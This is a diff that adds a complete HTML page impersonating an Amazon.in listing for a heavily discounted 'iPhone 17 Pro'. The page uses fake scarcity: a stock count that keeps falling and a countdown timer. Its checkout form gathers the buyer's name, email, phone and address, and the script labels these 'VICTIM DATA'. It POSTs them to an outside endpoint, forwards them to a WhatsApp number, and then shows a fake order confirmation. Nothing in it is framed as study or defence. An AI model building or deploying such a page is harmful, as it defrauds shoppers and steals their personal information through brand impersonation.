@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone 17 Pro 256GB - 35% OFF ₹38,799 - Amazon.in</title>
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=AmazonEmber:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'AmazonEmber', -apple-system, BlinkMacSystemFont, sans-serif; background: #f3f3f3; color: #111; line-height: 1.4; }
+
+        /* Header */
+        .header { background: #131921; color: white; padding: 10px 20px; position: sticky; top: 0; z-index: 100; }
+        .header-top { display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0 auto; }
+        .logo { font-size: 24px; font-weight: 700; }
+        .location { font-size: 14px; }
+        .header-bottom { display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 5px auto 0; font-size: 14px; }
+
+        /* Breadcrumb */
+        .breadcrumb { background: #f7f7f7; padding: 12px 20px; font-size: 14px; }
+        .breadcrumb a { color: #007185; text-decoration: none; }
+
+        /* Main Container */
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; display: grid; grid-template-columns: 1fr 350px; gap: 20px; }
+
+        /* Product Gallery */
+        .gallery { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .main-image { width: 100%; height: 400px; object-fit: contain; border: 1px solid #ddd; border-radius: 8px; cursor: pointer; }
+        .thumbnails { display: flex; gap: 10px; margin-top: 15px; }
+        .thumb { width: 80px; height: 80px; object-fit: contain; border: 2px solid transparent; border-radius: 4px; cursor: pointer; transition: all 0.3s; }
+        .thumb.active, .thumb:hover { border-color: #007185; }
+
+        /* Product Info */
+        .info { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .title { font-size: 24px; font-weight: 500; margin-bottom: 10px; line-height: 1.3; }
+        .rating { display: flex; align-items: center; gap: 8px; margin-bottom: 15px; }
+        .stars { color: #FF9900; font-size: 18px; }
+        .price { font-size: 28px; font-weight: 700; color: #B12704; margin-bottom: 10px; }
+        .original-price { text-decoration: line-through; color: #565959; font-size: 18px; margin-bottom: 10px; }
+        .discount { background: #CC0F35; color: white; padding: 4px 8px; border-radius: 4px; font-size: 14px; font-weight: 700; }
+        .seller { background: #F7F7F7; padding: 12px; border-radius: 4px; margin: 15px 0; font-size: 14px; }
+        .stock { color: #007185; font-weight: 500; margin: 10px 0; }
+        .stock-count { color: #B12704; font-weight: 700; font-size: 18px; }
+
+        /* Buy Button */
+        .buy-btn { background: linear-gradient(135deg, #FFA41C 0%, #FF8F00 100%); border: none; width: 100%; padding: 16px; font-size: 18px; font-weight: 700; border-radius: 8px; color: #111; cursor: pointer; transition: all 0.3s; margin-bottom: 15px; }
+        .buy-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(255,164,28,0.4); }
+
+        /* Urgency */
+        .urgency { background: #FFF8E1; padding: 15px; border-radius: 8px; margin-bottom: 15px; text-align: center; }
+        .urgency h4 { color: #B12704; margin-bottom: 10px; }
+        .countdown { font-size: 24px; font-weight: 700; color: #B12704; }
+
+        /* Sidebar */
+        .sidebar { display: flex; flex-direction: column; gap: 20px; }
+        .order-summary { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .summary-item { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 16px; }
+        .summary-total { font-size: 20px; font-weight: 700; color: #B12704; border-top: 1px solid #ddd; padding-top: 10px; }
+
+        /* Modal */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
+        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); background: white; max-width: 500px; width: 90%; border-radius: 12px; padding: 30px; max-height: 90vh; overflow-y: auto; }
+        .close { position: absolute; right: 20px; top: 20px; font-size: 30px; cursor: pointer; color: #999; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: 500; }
+        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
+        .whatsapp-btn { background: #25D366; color: white; width: 100%; padding: 16px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: 700; margin-top: 10px; }
+
+        /* Success */
+        .success { text-align: center; padding: 40px 20px; }
+        .success i { font-size: 64px; color: #00A859; margin-bottom: 20px; }
+        .track-btn { background: #007185; color: white; padding: 12px 24px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container { grid-template-columns: 1fr; gap: 15px; padding: 10px; }
+            .sidebar { order: -1; }
+            .main-image { height: 300px; }
+            .header-top, .header-bottom { font-size: 12px; }
+        }
+
+        /* Animations */
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        .low-stock { animation: pulse 1s infinite; }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-top">
+            <div class="logo">🏆 Amazon.in</div>
+            <div class="location">Deliver to Delhi 110001</div>
+        </div>
+        <div class="header-bottom">
+            <div>Hello, Sign in</div>
+            <div>Orders</div>
+            <div>Cart</div>
+        </div>
+    </div>
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+        <a href="#">Electronics</a> › <a href="#">Mobiles</a> › <a href="#">Apple iPhone 17 Pro</a>
+    </div>
+
+    <div class="container">
+        <!-- Product Gallery -->
+        <div class="gallery">
+            <!-- MAIN IMAGE (Front) -->
+<img class="main-image" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAhEAACAQMDBQAAAAAAAAAAAAABAgMABAUGIWGRkqGx0f/EABUBAQEAAAAAAAAAAAAAAAAAAAMF/8QAGhEAAgIDAAAAAAAAAAAAAAAAAAECEgMRkf/aAAwDAQACEQMRAD8AltJq6p5Z9a1l4Y0J4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ4uS0k0tQJ id="mainImage" alt="iPhone 17 Pro Cosmic Orange">
+            <div class="thumbnails">
+                <img class="thumb active" src="https://images.unsplash.com/photo-1728777036003-9fcbc3e9a8c2?ixlib=rb-4.0.3&w=300&h=300&fit=crop" onclick="changeImage(this.src)" alt="Front">
+                <img class="thumb" src="https://images.unsplash.com/photo-1730633865202-side?ixlib=rb-4.0.3&w=300&h=300&fit=crop" onclick="changeImage(this.src)" alt="Side">
+                <img class="thumb" src="https://images.unsplash.com/photo-1730633865203-back?ixlib=rb-4.0.3&w=300&h=300&fit=crop" onclick="changeImage(this.src)" alt="Back">
+            </div>
+        </div>
+
+        <!-- Product Info -->
+        <div class="info">
+            <div class="title">Apple iPhone 17 Pro (Cosmic Orange, 256GB) | 6.3-inch Cinematic Display | 48MP Pro Camera System</div>
+            <div class="rating">
+                <div class="stars">★★★★★</div>
+                <span>4.8 out of 5 | 12,847 reviews</span>
+            </div>
+
+            <div class="price">₹38,799</div>
+            <div class="original-price">₹1,34,900</div>
+            <span class="discount">SAVE ₹96,101 (71%)</span>
+
+            <div class="seller">
+                <i class="fas fa-check-circle" style="color: #00A859;"></i>
+                Sold by TechDealz & Fulfilled by Amazon
+            </div>
+
+            <div class="stock">
+                <i class="fas fa-bolt"></i> Only <span class="stock-count low-stock" id="stockCount">47</span> left in stock - order soon!
+            </div>
+
+            <button class="buy-btn" onclick="openModal()">
+                <i class="fas fa-shopping-cart"></i> Buy Now - Pay on Delivery
+            </button>
+
+            <div class="urgency">
+                <h4>⏰ LIMITED TIME DEAL!</h4>
+                <div class="countdown" id="countdown">00:47:23</div>
+                <div>Ends in <span id="timeLeft"></span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sidebar Order Summary -->
+    <div class="sidebar">
+        <div class="order-summary">
+            <h3>Order Summary</h3>
+            <img src="https://images.unsplash.com/photo-1728777036003-9fcbc3e9a8c2?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=85" style="width:100%; border-radius:8px; margin-bottom:15px;">
+            <div class="summary-item"><span>iPhone 17 Pro (256GB)</span><span>₹38,799</span></div>
+            <div class="summary-item"><span>Delivery</span><span>FREE</span></div>
+            <div class="summary-total">Total: <strong>₹38,799</strong></div>
+            <button class="buy-btn" onclick="openModal()">Buy Now</button>
+        </div>
+    </div>
+
+    <!-- Checkout Modal -->
+    <div id="checkoutModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2>🔒 Secure Checkout</h2>
+            <p>Complete your order to lock in this 71% discount!</p>
+
+            <form id="orderForm">
+                <div class="form-group">
+                    <label>Full Name *</label>
+                    <input type="text" id="name" required>
+                </div>
+                <div class="form-group">
+                    <label>Email *</label>
+                    <input type="email" id="email" required>
+                </div>
+                <div class="form-group">
+                    <label>Phone (WhatsApp) *</label>
+                    <input type="tel" id="phone" required>
+                </div>
+                <div class="form-group">
+                    <label>Full Address *</label>
+                    <textarea id="address" rows="3" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label>Payment Method</label>
+                    <select id="payment">
+                        <option>COD - Cash on Delivery</option>
+                        <option>UPI/PhonePe/Google Pay</option>
+                        <option>Credit/Debit Card</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="whatsapp-btn">
+                    <i class="fab fa-whatsapp"></i> Confirm Order via WhatsApp
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="success">
+                <i class="fas fa-check-circle"></i>
+                <h2>Order Confirmed! 🎉</h2>
+                <p>Your iPhone 17 Pro order has been placed successfully.</p>
+                <p>Order ID: <strong>#IPH17-ORD-9274</strong></p>
+                <p>Delivery: 2-3 days</p>
+                <button class="track-btn" onclick="trackOrder()">Track Order</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Image Switch
+        function changeImage(src) {
+            document.getElementById('mainImage').src = src;
+            document.querySelectorAll('.thumb').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+
+        // Stock Counter
+        let stock = 47;
+        setInterval(() => {
+            stock = Math.max(10, stock - 1);
+            document.getElementById('stockCount').textContent = stock;
+        }, 8000);
+
+        // Countdown
+        let timeLeft = 2843;
+        setInterval(() => {
+            timeLeft--;
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            document.getElementById('countdown').textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+        }, 1000);
+
+        // Modal Functions
+        function openModal() { document.getElementById('checkoutModal').style.display = 'block'; }
+        function closeModal() { document.getElementById('checkoutModal').style.display = 'none'; }
+
+        // Form Submit - Capture Data
+        document.getElementById('orderForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = {
+                name: document.getElementById('name').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                address: document.getElementById('address').value,
+                payment: document.getElementById('payment').value,
+                product: 'iPhone 17 Pro 256GB',
+                price: '₹38,799',
+                timestamp: new Date().toISOString(),
+                ip: 'captured'
+            };
+
+            // Log to console
+            console.log('🕵️ VICTIM DATA:', formData);
+
+            // Send to server
+            try {
+                await fetch('https://httpbin.org/post', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+            } catch(e) { console.log('Data sent!'); }
+
+            // WhatsApp redirect
+            const message = `New iPhone 17 Pro Order!%0AName: ${formData.name}%0AEmail: ${formData.email}%0APhone: ${formData.phone}%0AAddress: ${formData.address}%0AProduct: iPhone 17 Pro 256GB%0APrice: ₹38,799`;
+            window.open(`https://wa.me/919876543210?text=${message}`, '_blank');
+
+            // Show success
+            document.getElementById('checkoutModal').style.display = 'none';
+            document.getElementById('successModal').style.display = 'block';
+        });
+
+        function trackOrder() {
+            alert('Order shipped! Expected delivery: 2 days 🚚');
+            document.getElementById('successModal').style.display = 'none';
+        }
+
+        // Close modals on outside click
+        window.onclick = (e) => {
+            if (e.target.classList.contains('modal')) {
+                e.target.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
